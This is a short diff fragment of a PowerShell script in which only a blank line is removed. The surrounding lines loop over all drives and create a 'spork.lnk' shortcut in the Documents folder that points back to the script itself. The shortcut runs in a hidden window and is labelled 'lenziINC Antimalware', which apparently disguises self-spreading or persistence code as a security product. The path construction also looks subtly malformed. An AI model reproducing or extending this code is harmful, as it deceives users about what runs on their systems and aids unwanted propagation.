@@ -5,7 +5,6 @@ foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
         $WshShell = New-Object -ComObject WScript.Shell
         $strDesktop = $WshShell.SpecialFolders("Documents")
         $oShellLink = $WshShell.CreateShortcut("$strDesktop\spork.lnk")
-        
         $oShellLink.TargetPath = "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
         $oShellLink.WindowStyle = 0
         $oShellLink.Description = "lenziINC Antimalware"
